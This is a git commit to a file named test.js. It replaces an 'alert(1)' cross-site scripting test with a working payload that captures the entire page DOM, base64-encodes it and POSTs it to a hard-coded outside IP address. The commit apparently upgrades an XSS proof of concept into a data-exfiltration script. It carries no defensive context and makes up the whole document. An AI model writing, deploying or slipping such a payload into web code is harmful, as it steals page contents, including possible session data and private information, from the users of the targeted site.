02a766f8226c35e7c526fe755c141fcec6c8752c
harikumar69 <115579391+harikumar69@users.noreply.github.com>
2025-01-05 18:47:45 +0545

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,14 @@
-alert(1)
+(async () => {
+    // Get the entire DOM content as a string
+    const domContent = document.documentElement.outerHTML;
+
+    // Encode the DOM content in Base64
+    const encodedDOM = btoa(domContent);
+
+    // Send the encoded DOM to your server
+    await fetch('http://130.162.225.103:1234', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ data: encodedDOM }),
+    });
+})();
